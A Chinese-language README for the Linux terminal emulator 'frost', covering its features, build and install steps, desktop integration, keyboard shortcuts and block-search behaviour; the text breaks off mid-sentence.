# frost

frost 是一个面向 Linux 的现代终端模拟器，使用 Rust、iced 和 wgpu 构建。它把多标签、分屏、完整回滚搜索、会话恢复和 GPU 渲染放进一个轻量桌面应用，同时默认收紧远程终端可触达的宿主能力。

## 主要能力

- 多标签、拖动排序、快速标签切换，以及 tmux 风格的树状分屏（任意 pane 可再沿任一方向嵌套拆分）
- 拖动普通单-pane tab 到目标 pane 的四边即可无损并入分屏；拖动分屏标题栏回 tab 栏即可恢复为普通 tab。拖动悬停标签约半秒会预览目标页，中心释放安全取消，现有 PTY 不会重启或复制
- 搜索当前屏幕与全部 scrollback，支持大小写匹配、正则和自动滚动定位
- 查找替换面板（`Ctrl+Alt+R`）：scrollback 是只读输出，替换作用于当前选中文本——结果复制到剪贴板，或不带回车回填到提示符；支持字面/正则、大小写、全词与全部替换
- UTF-8、中文宽字符、True Color、256 色、鼠标报告、括号粘贴和扩展键盘协议
- Kitty 图像直接传输（`f=100` PNG、`f=24` RGB、`f=32` RGBA），协议的结构层与 anvil/2/4 共用 `jterm_core::kitty_graphics`；带传输、像素、解压内存和放置数量上限，并对带 `i=`/`I=` 的命令回送 `OK` / `EINVAL` / `ENOTSUP` / `ENOENT` 应答
- 文件侧栏、路径插入、链接识别、命令面板、主题编辑和实时设置
- OSC 8 显式超链接会随网格、scrollback 与 resize/reflow 保留；`Ctrl+单击` 打开时与文本
  检测链接共用同一套安全策略，只允许无凭据、无视觉欺骗的绝对 HTTP(S) URL。URI、id 和
  会话内链接表均有硬上限，过期 viewport 点击会按投影版本拒绝而不会误开新位置的目标
- 文件侧栏按目录异步懒加载，支持返回上级与刷新；慢盘、NFS/FUSE 不再阻塞主界面。侧栏还可通过
  `[[remote_hosts]]` 原生浏览 SSH 主机与运行中的 Docker 容器（无需 sshfs）：远程一侧只运行一段
  标准 POSIX sh 探测脚本（经 `ssh` / `docker exec` 的 stdin 传入）。右键任意节点或空白区可打开
  文件操作菜单：新建文件/目录、重命名、删除（含确认框）、复制/剪切/粘贴、复制路径与刷新，
  本地与远程行为一致；`Ctrl+点击` 多选、`Shift+点击` 按可见顺序框选范围，多选后删除/复制/剪切/
  复制路径按批处理（逐项失败不中断、末尾汇总；删除确认框列出数量与前几个路径）。标题栏的
  ⌕ 按钮打开行内名称过滤：大小写无关子串匹配已加载的树（命中项与其祖先保留并强制展开，清空后
  恢复原展开状态，不产生新的目录扫描）。标题区的 **Hidden** 开关统一控制本地与远端点文件；每次
  切换都以新 generation 刷新当前根，旧可见性策略下的慢响应无法回写新树。刷新尤其针对慢远端采用
  stale-while-refresh：现有行、已加载子树与展开状态继续可见；成功结果按路径与类型增量对账，失败则
  保留最后一次成功内容并内联显示错误；初次加载错误和任意目录的刷新错误都提供可聚焦的 **Retry**，
  并明确区分 Loading 与 Refreshing。Files 面板在鼠标位于其范围内时支持裸 `F5` 刷新，终端区域仍会
  收到标准 F5 输入。每个目录请求另有同 generation 的 request id 与取消令牌；同路径新请求、根代次或
  位置变化会主动退役排队与在途 list，排队任务在启动 SSH/Docker 前失败关闭，在途任务复用进程组
  watchdog 终止并回收。目录扫描由有界 coordinator 调度：最多 2 个并发、64 个排队，且每个远端
  authority 最多排队 16 个；根刷新与 Retry 优先，同时每 3 个高优先任务后给懒加载一次机会，高优先
  请求只能替换同 authority 的懒加载，同路径排队请求合并，溢出拒绝和 worker 异常都会回写明确终态；
  每个 authority 最多占一个执行槽，不可达主机不会同时堵住 Local 与另一远端。
  coordinator 还显示最老排队时间和最近一次排队/执行耗时。错误按超时、连接、权限、无效响应等类型
  归类并只显示脱敏、单行、Unicode 安全文案；transport 失败按 authority、权限/不存在按 path 做
  2–60 秒分类指数冷却，显式 Retry 只旁路一次；无排队/在途引用的过期冷却会在后续调度时清理。
  每个成功快照记录更新时间，超过 5 分钟会标为 stale；
  Files 可见时每轮至多低优先重验两个最老的可见/展开陈旧目录，刷新失败继续显示 last-good 的年龄。
  文件操作完成后只重扫真正受影响的父目录（含折叠目录缓存），不再用根刷新掩盖嵌套目录陈旧；成功
  rename/move 会按组件前缀恢复选择与 anchor，失败或取消也会重扫可能已在远端生效的父目录。对账按
  本次目录子树清理已消失路径的选择、悬停、拖放和延迟操作，跨父目录移动不会被先返回的扫描误删。
  Remote 路径导航先扫描候选目录，成功才原子换根；失败或乱序响应保留原树、选择和展开状态。
  标题栏提供 Back/Forward/Parent/Home、≤32 项成功历史、可点击面包屑与安全绝对路径栏；路径栏拒绝
  超长、相对、`.`/`..`、控制与 Bidi 输入。鼠标位于 Files 时可用 `Alt+Left` / `Alt+Right` /
  `Alt+Up` / `Alt+Home`，目录右键的 **Open Folder** 可把该目录设为当前根。成功离开的根进入按
  authority + path + Hidden 策略隔离的 8 项缓存，返回时仅在候选扫描成功后复用幸存子树；文件操作
  精确失效受影响父目录的缓存。Remote Home 复用切换位置时已验证的绝对 UTF-8 home，不重复启动探针。
  Remote list v4 由客户端下发 `4096 + 1` 硬上限与隐藏策略，远端到限即停，第 4097 项可靠标记
  “仅显示前 4096 项”。非法 UTF-8/非单组件/重复路径不会生成可操作行，目录符号链接按文件显示且
  不可展开。跨位置粘贴即为上传/下载（不同远端文件系统经本地临时中转；
  同一主机的保存 profile 与临时 live socket 直接复制/移动），
  文件按流式传输、目录经 tar 转发（目录上传在解包前原子拒绝同名目标），实时显示传输进度
  （可随时取消，取消不会留下半截文件），全程有 512 MiB 上限与超时保护，远端失败会在面板内联显示。
  从系统文件管理器把文件/目录拖放到文件树即可导入：落在目录行上导入该目录、其余位置导入当前根目录，
  远程位置走同一条上传通道；一次拖放最多 256 项、总量不超过传输上限，同名目标逐项拒绝。
  Files 标题区的 **Terminal here** 会从当前本地树根新建标签；远端时入口明确显示
  **Remote terminal (default dir)**，复用同一 profile 连接并进入其默认目录。远端 profile 列表
  之外，直接在本地 pane 输入 `ssh user@host -p 22`（包括 jsh 实际生成的受信 launcher）也会自动识别
  真实前台进程：优先切到唯一匹配的已保存 profile，否则建立该会话专属的临时远端树；连接探测
  成功前保留原树，SSH 退出后远端树仍可继续使用。受信 jsh 连接会复用其 ControlMaster socket；
  二次探测失败后 Files 内可直接 Retry。终端输出或 OSC 文本不能
  触发连接，带远程命令或会重复执行本地 helper 的 SSH 参数会安全跳过；密码连接无法供无交互文件
  探针复用时会提示配置 key、agent 或 control socket，而不是清空当前树。远端 profile 列表编辑或
  热重载后，活动位置只在旧 profile 的完整身份于新列表中恰有一个匹配时重映射；删除、修改或
  重复身份都会安全回到 Local，并作废旧选择、文件剪贴板、对话框、拖放计划与传输。远端 home 探测
  在手动切换 profile 时失败会回到可用的 Local 树并保留内联错误，可直接重新选择 profile 重试。
- 自动保存标签工作目录并恢复会话；多实例之间不会互相覆盖恢复数据
- OSC 10/11/12 动态颜色、OSC 52/5522 剪贴板和桌面通知
- OSC 133 Block mode：完成命令、Background 输出和当前输入/运行区以主题相对卡片呈现（状态条、轻染色、圆角、状态/耗时徽标，支持普通与 Compact Block Spacing），空闲提示符处、用户编辑前的异步输出会形成 Background 块，运行中块实时显示已用时间——
该徽标锚定在运行卡片**当前可见的顶部行**，命令输出滚过一屏后仍然可见并继续走秒；
完成块的徽标在行尾空白不足时会逐级缩短（依次舍去完成时刻、生命周期文字、耗时、信号名），
而不是整条消失，任何缩短形式都保留结果字形，非健康生命周期保留 `~` 标记；支持块选择、右键动作、书签、失败/慢命令/Background 筛选、复制/回填、多块 Markdown、整会话 Markdown/JSON 导出与跨块搜索，历史修剪后已捕获的块输出仍可搜索和复制
- 持久化命令历史与模糊选择器（`Ctrl+Shift+H`）：完成的命令连同目录、退出码写入与 anvil/forge 同格式的 JSONL 索引（从不保存输出），跨重启召回；Enter 只把选中命令回填到提示符，不自动执行
- 参数化 workflow（`Ctrl+Shift+M`，或命令面板的 **Workflows** 动作）：从 `~/.config/frost/workflows/`、`FROST_WORKFLOW_DIR`、XDG 数据目录与内置示例（`scripts/workflows/`）加载与 anvil/ember/forge **同一份** TOML/YAML 模板库（自 2026-08-29 起四个终端共用 `jterm_core::workflows` 这一份加载/校验/渲染实现，因此同一个文件在哪个终端里打开都是同一个意思），同名时靠前的目录优先；带参数的模板先弹出逐参数表单（声明了 `default` 的参数预填该默认值，每行的 **Reset** 可恢复该默认值），渲染结果只回填到提示符供人工审阅，绝不自动执行；**文件里没有声明 `default` 的参数不再被当作空串**——留空（或只填空白）时 Insert 会拒绝并提示 `missing values: <参数名>`，这些行在按下 Insert 之前就带 `(required)` 标记，详见下方“workflow 参数的必填约定”；命令经共享 review-only 边界校验，拒绝控制字符与视觉欺骗字符，文件大小/数量均有上限，符号链接与特殊文件直接拒绝
- 持久化 AI Chats（`Ctrl+Shift+Alt+A`，或命令面板的 **AI Chats** 动作）跨重启保存会话；命令面板的 **Ask AI: Generate Command** 可把自然语言请求生成可编辑的命令草稿，经过提示符与输入安全门后只回填供人工审阅，绝不自动执行
- 长命令完成桌面通知：OSC 133 计时超过阈值（默认 10 秒）且命令不在正被注视的 pane（窗口失焦或非活动 pane）时提醒
- 分屏 pane 标题栏显示所在目录的 git 分支与脏状态（后台探测并缓存，从不逐帧运行 git）
- 有界 PTY 输入/输出队列、稳定会话身份校验和繁忙进程关闭保护
- Shell Agent 提案始终逐条人工审批；只有绑定 pane 处于空闲且提示符输入为空时才可发送，
  命令完成结果按一次性执行代次精确关联，迟到或仅后缀相同的输出不会推进 Agent
- 失败命令块（OSC 133 报告非零退出码的已完成块）在右键菜单与命令面板中提供
  **Fix with Agent** / **Explain with Agent** / **Retry** 动作。Fix/Explain 把精确命令、
  有界捕获输出和已验证的 cwd 作为框架化不可信上下文，开启一个全新的 Agent 任务：绝不接续
  无关的历史会话快照，任务始终按稳定会话 id 绑定来源 pane（焦点切换不影响），也不会替换仍在
  运行的已批命令、待审提案或未结束的会话。Retry 走守护式语义重放：仅精确、未截断、单行的命令，
  且仅当块记录的 cwd 与独立观测到的本地 shell 进程 cwd（`/proc`）一致时才执行——SSH/tmux 类
  包装进程的本地 cwd 不代表其报告的工作目录，因此失败关闭；此外还要求主屏幕、提示符空闲、
  输入为空且开启 bracketed paste。被 16 KiB 上限截断的命令与 Background 块一律不进入
  Retry/Agent 路径
- 失败命令的评审式纠正卡片（`command_correction_enabled`，默认关闭）：引擎与 anvil/forge/ember
  共用 `jterm_core::command_correction`。本机可验证的证据（目标自身给出的拼写建议、APT 索引、
  可执行 PATH）优先且从不联网；严格 JSON 的 AI 兜底另需 `ai_share_command_context = true`，
  未授权时静默跳过。卡片内容全部经引擎脱敏，危险命令带 `⚠ destructive:` 标签，
  未验证或被编辑过的候选只回填提示符、仍需自己按回车。详见“失败命令的评审式纠正”
- PTY 启动采用 fork→exec 错误握手；无效目录、shell/exec 失败会显示可重试诊断而不是崩溃
- 配置与快捷键热重载采用 last-known-good；坏文件会显示路径/行列并暂停自动写回
- 字体探测与桌面通知只调用固定可信系统程序，独立进程组内并发有界读取 stdout/stderr，
  统一超时后终止并回收整组；工作目录或可写 `PATH` 项不能替换这些后台 helper

## 构建与运行

目前支持 Linux。项目使用 Rust stable 工具链（`rust-toolchain.toml` 会由 rustup 自动选择），并需要 Fontconfig、Wayland/X11 和 OpenGL/EGL 的开发库。Ubuntu/Debian 可安装：

```bash
sudo apt-get install pkg-config libfontconfig1-dev libwayland-dev \
  libx11-dev libx11-xcb-dev libxcb1-dev libxcb-render0-dev \
  libxcb-shape0-dev libxcb-xfixes0-dev libxcursor-dev libxi-dev \
  libxrandr-dev libxkbcommon-dev libegl1-mesa-dev libgl1-mesa-dev
```

然后构建：

```bash
rustup toolchain install stable --profile minimal --component rustfmt --component clippy
cargo build --release --locked
./target/release/frost
```

## 安装（含桌面集成）

```bash
./scripts/install.sh              # 构建并安装二进制 + 启动器条目
./scripts/install.sh --binary /path/to/frost  # 安装已构建的二进制，跳过 Cargo
./scripts/install.sh --dry-run    # 只打印将要执行的命令，不改动文件
./scripts/install.sh --no-desktop # 安装二进制 + workflow，省略桌面集成
./scripts/uninstall.sh            # 一并移除；配置与历史保留
```

安装脚本会把六个 workflow 示例一并复制到运行时数据目录。默认前缀会遵循
`XDG_DATA_HOME`，未设置时对应
`~/.local/share/frost/workflows/`；标准 `/usr`、`/usr/local` 前缀则由
`XDG_DATA_DIRS` 覆盖，因此移动预构建二进制或删除源码 checkout 后仍有同一套示例。显式指定
`PREFIX` 时安装到 `PREFIX/share/frost/workflows/`；自定义的非 XDG 前缀需把
`PREFIX/share` 加入 `XDG_DATA_DIRS`。`--no-desktop` 只省略启动器、AppStream 与图标，
不省略这些运行时资源。

`--binary` 适合发布压缩包、CI 产物和发行版打包：安装器不会调用 Rust 工具链，仍会用同一套
受测路径安装二进制、workflow、desktop 文件、AppStream 元数据和图标。输入必须是可读且非
符号链接的普通文件；此路径要求 Linux 已挂载 `/proc/self/fd` 并提供 GNU `stat`，描述符固定不可用时会
明确报错。这里的 Bash 实现并非原子的 no-follow open；只有在文件成功打开且路径名与描述符
完成同一 inode 的身份复核后，之后再替换路径名才不会改变经该描述符复制的 inode。目标二进制
权限统一设为 `0755`。目标同目录中的私有临时文件写完后，由 GNU `mv -T` 原子替换；复制失败
或发布阶段前退出会清理整批未提交临时文件并保留旧版本。binary、workflow、desktop、元数据与
图标会全部 staging 成功后才开始 rename；资源先发布，二进制作为最后一个提交点，因此任何
复制/转换失败都不会留下半升级。发布前还会为每个既有目标创建不跟随符号链接的同目录回滚
快照：优先 hardlink 原 inode，因此 owner/group、mode、xattr、hardlink 关系及 dangling symlink
对象都能原样恢复；文件系统或安全策略拒绝 hardlink 时回退到不跟随链接的 `cp -a`，此时保证
内容、mode 与链接值，但不承诺保留原 owner/group 或 inode。rename 失败或可捕获的终止信号会
按逆序恢复已尝试目标。各 rename 自身原子，但整批
rename 不是文件系统事务：`SIGKILL`、掉电、并发目标替换或回滚本身的 I/O 故障仍可能留下混合
版本；恢复失败时 backup 会保留并打印路径，不会被清理。除上述条件外还需要 GNU coreutils 的
`cp`/`ln`/`mktemp`/`mv`。它可与
`--prefix`、`--bin-dir`、`--no-desktop` 和 `DESTDIR` 组合使用。
零字节预编译产物会在旧目标改变前被拒绝。desktop、AppStream、SVG 与 PNG 源文件都在
构建/写入前预检，公共资源也以明确权限写入目标同目录临时文件后原子 rename。非根
`DESTDIR` 会先折叠重复 `/` 和词法 `.` 段，再从 `/` 起检查完整既存组件链；任何
符号链接都会在首次写入或删除前失败；安装会先验证 binary、workflow 以及每个 desktop
资源分支，卸载也会先验证完整目标集合，较晚的坏路径不会造成前面文件已改的部分状态。
该检查只描述预检时的状态，不承诺抵御之后的并发
路径替换；正常主机 prefix 不套用这条策略。

默认装到 `~/.local`（可用 `--prefix` / `--bin-dir` 覆盖，打包场景用 `DESTDIR`）：

| 内容 | 位置 |
| --- | --- |
| 二进制 | `~/.local/bin/frost` |
| 启动器条目 | `~/.local/share/applications/io.github.beamiter.frost.desktop` |
| 图标 | `~/.local/share/icons/hicolor/{scalable,128x128,256x256}/apps/io.github.beamiter.frost.*` |
| AppStream 元数据 | `~/.local/share/metainfo/io.github.beamiter.frost.metainfo.xml` |

安装与卸载脚本都从同一组运行时路径推导目标：二进制默认为 `PREFIX/bin/frost`，
桌面文件和图标位于 `PREFIX/share`。再次运行安装脚本会更新同一目标。`--bin-dir`
只覆盖二进制目录；之后卸载时也应传入同一个 `--bin-dir`。`DESTDIR` 只在这些
运行时绝对路径前追加打包根目录，desktop 文件中的 `Exec=` 仍指向不含
`DESTDIR` 的运行时路径。
这些运行时绝对路径可包含空格、Unicode 和 `.` 段；空值、控制字符和词法 `..` 段会被拒绝。
只有 `DESTDIR` 的拼写会按上文做词法规范化。
若 binary 目录不在 `PATH`，安装结束会输出一行可直接加入 `~/.profile` 的
`export PATH=...:"$PATH"`；目录使用 Bash 可逆 quoting，空格、单引号、`$` 等字符不会
截断或注入命令。`command -v frost` 检出的旧副本路径也以同样方式显示。

旧版源码安装脚本曾错误地把无参数安装写到 `~/.cargo/bin/frost`。新脚本不会
自动删除那个可能由用户显式管理的文件；若升级后 `command -v frost` 仍指向旧
位置，可先核对它确实是旧副本，再执行
`rm -f -- "$HOME/.cargo/bin/frost"`。卸载脚本总会同时移除所选 prefix 下的桌面
集成，因此不应仅为清理旧二进制而运行它。

这套桌面集成才让 frost 出现在 GNOME/KDE 的应用列表里，可搜索、可点击启动、可固定到
dock。有三个细节决定它到底显不显示，安装脚本都已处理：

- `Exec=` / `TryExec=` 会被改写成二进制的绝对路径（`/usr` 这类系统 prefix 保留相对
  形式以便重定位）。桌面会话的 `PATH` 在登录时就固定了，若 `~/.local/bin` 不在其中，
  `TryExec=frost` 会失败并让条目**整个从应用列表消失**。自定义路径中的空格、`$` 和
  反斜杠会按 Desktop Entry 规范分别编码到 `Exec` / `TryExec`；规范禁止可执行路径含
  `=`。含 `%` 的绝对路径还会落入「引号内 field code 行为未定义」的兼容陷阱，因此这
  两种路径在启用桌面集成时都会被安装器明确拒绝。
- 安装与卸载后都会刷新 `update-desktop-database` 和 `gtk-update-icon-cache`；陈旧的
  图标缓存会盖住刚装进去的图标。`DESTDIR` 打包时跳过，交给包管理器处理。
- 安装器会尝试删除更名前遗留的 `io.github.beamiter.jterm3.desktop`；这一步发生在新版本
  完整提交之后，只是迁移清理。`DESTDIR` 下会在删除点再次检查目录祖先；路径变化、权限等
  原因导致删除失败时会警告并继续刷新缓存、报告安装成功。
- `StartupWMClass` 为 `io.github.beamiter.frost`，与窗口真实的 `WM_CLASS` 一致。
  iced 把 `window::Settings` 里的 `platform_specific.application_id` 同时用作 X11
  `WM_CLASS` 与 Wayland app_id；不设置时两者都是空字符串，桌面环境无法把窗口关联到
  条目，dock 里只会出现一个没有图标、无法固定的窗口。

窗口本身也带图标：`data/io.github.beamiter.frost-128.png` 内嵌进二进制并在启动时交给
winit，因此即便直接 `cargo run`、或条目还没安装，`_NET_WM_ICON` 也是设好的——启动器条目
只能覆盖桌面环境能关联上的窗口。

可用 `desktop-file-validate <条目>` 与 `gtk-launch io.github.beamiter.frost` 自检。

也可以只手动安装二进制：

```bash
install -Dm755 target/release/frost "$HOME/.local/bin/frost"
```

默认字体会优先使用 SauceCodePro Nerd Font；未安装时 iced/Fontconfig 会回退到系统字体。可以在设置面板中选择任意已安装的等宽字体。

## 常用快捷键

| 操作 | 快捷键 |
| --- | --- |
| 新建标签 | `Ctrl+Shift+T` |
| 复制 / 粘贴 | `Ctrl+Shift+C` / `Ctrl+Shift+V` |
| 仅复制所选命令块的输出 | `Alt+复制快捷键`（默认 `Ctrl+Alt+Shift+C`；显式绑定优先；可见终端文本选区优先） |
| 搜索全部回滚 | `Ctrl+Shift+F` |
| 查找替换（选中文本） | `Ctrl+Alt+R`（替换结果进剪贴板或回填提示符，从不改写 scrollback） |
| 上/下一个命令提示符 | `Ctrl+Shift+↑` / `Ctrl+Shift+↓`（需 shell 发送 OSC 133 集成序列） |
| 复制上一条命令输出 | `Ctrl+Shift+G`（同样依赖 OSC 133） |
| 搜索命令块 | `Ctrl+Alt+F`（`All / Cmd / Out` 选择全部文本、仅命令或仅输出，`Ctrl+O` 循环；`Aa` / `.*` / `W` 组合大小写、正则和 Unicode 整词匹配；`Ctrl+I` / `Ctrl+R` / `Ctrl+W` 键盘切换；可筛选失败/慢命令/书签/Background；Enter 定位匹配输出行） |
| 添加/移除块书签 | `Ctrl+Shift+B`（仅作用于当前选择；无选择时按键继续交给 PTY；前后书签导航为 `Ctrl+,` / `Ctrl+.`） |
| Agent 修复 / 解释失败命令块 | `Ctrl+Alt+X` / `Ctrl+Alt+E`（作用于选中的或最新的失败块，需 OSC 133） |
| 重试失败命令块 | `Ctrl+Alt+T`（cwd 一致时原样重放该块命令） |
| 折叠/展开所选块输出 | `Ctrl+Alt+Z`（只作用于当前选中块；无选区时提示而不误折叠） |
| 全选命令块 | `Ctrl+Shift+A` |
| 清空已完成命令块 | `Ctrl+Shift+K`（显示块数并要求确认；不可撤销；保留当前提示符或运行中命令） |
| 回填所选命令 | `Ctrl+Shift+I`（只回填，不执行） |
| 历史命令选择器 | `Ctrl+Shift+H`（Enter 回填到提示符不执行；`Ctrl+R` 留给 shell 自身） |
| Workflow 选择器 | `Ctrl+Shift+M`（带参数的模板进入逐参数表单；未声明 `default` 的参数必填，留空时 Insert 拒绝渲染；渲染结果只回填到提示符不执行） |
| AI Chats | `Ctrl+Shift+Alt+A`（跨重启保存会话；也可从命令面板打开） |
| 命令面板 | `Ctrl+Shift+P` |
| 快速切换标签 | `Ctrl+Shift+L` |
| 标签 1–8 / 最后一个 | `Ctrl+1`…`Ctrl+8` / `Ctrl+9` |
| 左右 / 上下分屏 | `Ctrl+Shift+E` / `Ctrl+Shift+D`（拆分聚焦 pane；同向并入同级，异向嵌套子分屏，最多 12 个 pane） |
| 方向聚焦 Pane | `Ctrl+Alt+方向键`（按几何位置跨嵌套跳转，边缘不回绕） |
| 调整 Pane 大小 | `Ctrl+Alt+Shift+方向键`（双击分割线均分该节点） |
| Pane 缩放（临时全屏） | `Ctrl+Shift+Z` |
| 交换相邻 Pane | `Ctrl+Shift+X` |
| 关闭聚焦 Pane / 当前标签 | `Ctrl+Shift+W`（分屏时其余 pane 保持） |
| 文件/标签侧栏 | `Ctrl+\` |
| Shell Agent | `Ctrl+Alt+G` |
| 设置 | `Ctrl+Shift+O` |
| 临时放大 / 缩小 / 恢复配置字号 | `Ctrl+=` / `Ctrl+-` / `Ctrl+0` |
| 窗口透明度增 / 减 | `Ctrl+Alt+=` / `Ctrl+Alt+-`（写回配置 `opacity`，设置面板也有滑块） |

Block mode 的命令首行支持普通单击；`Shift+单击` 可从卡片任意行选择连续范围，
`Ctrl+Shift+单击` 可从任意行切换单块。正文普通/双击/三击仍归终端原生文本选择，
`Ctrl+单击` 链接仍打开链接。右键卡片任意位置会在指针旁打开固定 pane/块目标的动作面板，
可复制、向 Agent 附加该块、回填、书签、跳转、搜索和导出；失败块额外提供
**Fix with Agent** / **Explain with Agent** / **Retry**；右键已选范围中的块不会折叠范围。
有精确保留输出的已完成块还提供 `Collapse output / Expand output`：折叠会从滚动文档中真正
移除输出行并放入一行可点击摘要，不修改 PTY 原始缓冲；块级复制、导出与 Agent 仍使用完整输出。
`Ctrl+Alt+Z` 与命令面板的 **Collapse or Expand Block Output** 是同一动作的键盘入口，但只作用于
**当前选中块**：右键菜单有指针指向的目标，快捷键没有，因此不会像复制类动作那样回退到"最新块"
去折叠你正在阅读的输出；无选区或该块输出已被淘汰时只提示，不做任何折叠。
折叠期间的文本选区会跨投影重建保留：命令输出继续打印时高亮不再被清空——每个端点记住自己
所在的稳定原始单元格，重建后重新定位（滚动位置本来就是这样跨同一次重建保持的）。在任何
可能让选区悄悄改变含义的情况下则一律安全丢弃（与旧行为一致）：列选择（Alt+拖动，因为
端点之间的行会被重新排布）、宽度变化（历史会重新折行）、以及有效折叠集合发生变化（刚露出
的行会落进用户从未拖过的范围）。被折叠的输出在整个过程中始终不可复制。
Block Mode 关闭或进入 alternate screen 时会暂时绕过折叠视图，返回后恢复原状态。
书签以琥珀标记同时显示在 gutter 与滚动条上，块被历史保留策略淘汰或执行
“清空已完成块”时自动移除。清空会统一经过确认框，明确当前 pane 将删除的块数，
并永久移除这些块记录、书签和已捕获输出；此操作不可撤销，但不会影响当前提示符或
正在运行的命令。无选区时 `Ctrl+↑` 从最新块开始选择；已有选区后普通 `↑/↓`
折叠到相邻块，`Shift+↑/↓` 扩缩连续范围（这三组键与 `Ctrl+Alt+Z` 一并列在帮助面板里）。
多块范围的活动边已经位于最新块时，Frost 的防误触策略是第一次普通 `↓` 只把范围收拢到
该最新块，第二次才退出选块状态并给出提示；一个误触不会直接清空整段选择。
选区存在且提示符空闲时，`Enter`
与 `Ctrl+Shift+I` 都会按终端顺序回填所选命令但不会执行；若提示符已有输入等原因无法回填，
`Enter` 仍按原样提交你输入的那一行，但会明确说明选区为何未被回填（与 `Ctrl+Shift+I` 同一措辞），
不再静默丢弃选区。命令运行中 `Enter`
仍原样交给前台程序。多命令只在 shell 开启 bracketed paste 时作为可编辑多行
文本保留，否则安全地只回填第一个逻辑行，后续换行绝不会触发执行。
`Ctrl+,` / `Ctrl+.` 会循环跳到上一个/下一个书签；已有块选区时
`Ctrl+Shift+↑/↓` 定位到活动块顶部/底部，无选区时仍保留原提示符导航快捷键。

块搜索的 `All / Cmd / Out` 范围可限制全部文本、仅命令或仅输出，`Ctrl+O` 循环切换；
范围过滤在 500 条命中上限之前完成，不会被另一类文本挤占结果预算。另支持
`All / Failed / Slow / Bookmarked / Background` 五种元数据视图；空查询时可直接
浏览筛选结果。每条结果都有独立、完整标注的 `☆ Bookmark` / `★ Remove` 操作；点击只更新该块的
书签，不会定位或关闭面板，同一块的重复命中会立即同步。`Ctrl+Shift+B` 明确作用于当前高亮结果，
并按一次物理 B 最多切换一次；刷新中或结果已淘汰时安全拒绝且在面板内说明原因。Bookmarked 为空时
会先指引切回 **All**、搜索一个块再添加书签，不再建议对不存在的选中行使用快捷键；已有书签但
当前 scope 没有可索引文本时，即使 query 非空也会准确说明缺少该 scope 文本，而非笼统报无匹配。
面板完全可键盘操作：`Tab` / `Shift+Tab` 循环筛选视图，`Ctrl+I` 切换大小写
敏感，`Ctrl+R` 切换 Rust 正则（与查找栏同一套约定），`↑/↓` 循环选择，`Home/End` 跳到
首尾，`PageUp/PageDown` 每次移动十条，`Enter` 定位、`Esc` 关闭；
点击筛选按钮或 `Aa` / `.*` 后焦点会立即交还查询框，不会让输入框静默失焦。`Shift+Enter`
就地跳到下一个命中而**不关闭面板**，因此顺着一条查询逐个查看结果不必反复重开面板重打查询；
只有目标仍存在且实际完成定位后才会关闭或前进；刚被淘汰的结果会刷新列表、保持面板并给出提示。
关闭后再打开会在当前窗口进程内恢复上次有效查询、匹配选项、范围和元数据视图，但不会写入配置
或会话快照；`Ctrl+U` 只清空查询，**Reset** 或 `Ctrl+Shift+U` 会把查询、匹配选项、范围及
元数据视图一次恢复默认，超过 4 KiB 的无效文本不会被记住。鼠标点击这些控件后仍会自动回焦查询框。
Block Search 4.4 会继续按完成块数量与首尾稳定 ID 感知新增和同长度 retention 轮换；刷新期间旧结果
明确标记为 `refreshing…`，异步索引完成后仍存在的稳定命中保持选中；若它已被淘汰则回退到最接近
的原排名，而查询或筛选意图变化仍从第一项开始，且任何旧索引都不可被误激活。可点击完整标签的
**Refresh** 按钮或按不带 Shift/Ctrl/Alt/Super 的单独 `F5` 强制获取新快照，按钮操作后查询框会立即重新获焦。
当前配置的 `block:search` 绑定优先；若把它重映射到 F5 或其修饰组合，该按键按面板切换键处理。
除此之外，一次物理 F5 按下最多只刷新一次；长按产生的键盘 repeat 事件与带修饰键的 F5 都不会重建索引，点击按钮不受此限制。
无效表达式会原地保留错误与最后有效结果，不启动无意义的 worker；若 worker 正忙，多次请求最多合并为一次后续构建；
若期间意图变成无效表达式或无筛选的空查询，则直接采用已完成构建而不再启动无用的第二个 worker。完成块版本确有变化时
仍优先重建最新快照，不会漏掉后台 churn，也不会并行叠加大索引。长按打开面板的 `block:search` 组合键不会让面板闪开即关：该物理按键后续的
repeat 事件只被面板消费，新的非 repeat 按下仍按原语义关闭面板。
`Enter` 仍是"定位并关闭"。结果行显示所属
块的状态与耗时徽标，命令行命中不再重复打印命令本身；计数行给出当前位置（如 `3 of 17
matches`）。若当前 pane 根本没有命令块，面板会直接说明需要 OSC 133 集成，而不是归咎于查询。
面板打开期间若后台有新块完成而触发重建，旧结果会以变暗样式保留并标注 `refreshing…`，
不再整列清空并把高亮弹回顶部；重建期间任何"定位"操作都会被拒绝，不会作用于过期命中。
结果列表按窗口渲染（一次最多 48 行，跟随高亮移动），因此宽泛查询命中数百条时面板不会随
命中数变卡——滚轮与拖动在窗口内照常可用，键盘上下键仍可遍历全部命中。
无效表达式明确报错、保留上一份可用索引但禁止激活旧结果。文本查询保存完整逻辑行中的 Unicode 字符跨度，因此
长行预览会围绕关键词截取，并能定位到 soft-wrap 后实际包含命中的物理行。若 scrollback 已淘汰但有
捕获快照，搜索与复制仍可用，定位会安全降级到逻辑行首或块首。Block Mode 关闭、命令运行中
或全屏程序占用 alternate screen 时，物理 Block 快捷键会透传给前台程序，不会只弹
提示后吞键；命令面板和右键菜单仍是明确的鼠标操作入口。

面板与提示的一致性：任何带输入框的浮层（块搜索、命令面板、历史选择器、查找栏等）都只需
**一次 `Esc`** 关闭——焦点输入框吞掉的那次 `Esc` 会被重新投递给浮层本身，且仅在确有浮层
持有 `Esc` 时才投递，绝不会变成发给前台程序的多余 ESC 字节。`Ctrl+Shift+↑/↓` 提示符导航
不再在无 OSC 133 的 pane 上静默吞键：没有任何提示符标记时说明需要 shell 集成，有标记但已
到边界时说明"没有更早/更新的提示符"。连续相同的提示会合并刷新而不是堆叠，因此按住快捷键
不会刷屏。

搜索索引优先保留最新块：UI 线程的 source retained ceiling 为 8 MiB（计入 source Vec
与 String capacity），lowercase 在后台构建，cache retained ceiling 为 16 MiB（计入 cache
Vec、原文与折叠文本的实际 capacity）。重建会先释放旧 cache/hits，不会同时持有
old+source+new 三份索引。惰性迭代器仍需先物化第一个被拒 source（单块输出上限约 1 MiB），
cache admission 也会短暂构造一个随后被预算拒绝的 lowercase candidate；这两项瞬时分配不属于
retained ceiling。同一 pane 同时只运行一个 cache worker；连续完成事件会合并，旧 worker
返回后先释放 stale build 再启动一次最新版本重建。索引期间可继续输入筛选条件；新命令完成、缺失 `D` 后由下一提示符
收束或产生 Background 块时会自动刷新。若预算省略了更老块，结果区会明确显示
`older blocks not indexed`，不会把部分索引伪装成完整历史。查询缓冲区（包括纯空白粘贴）
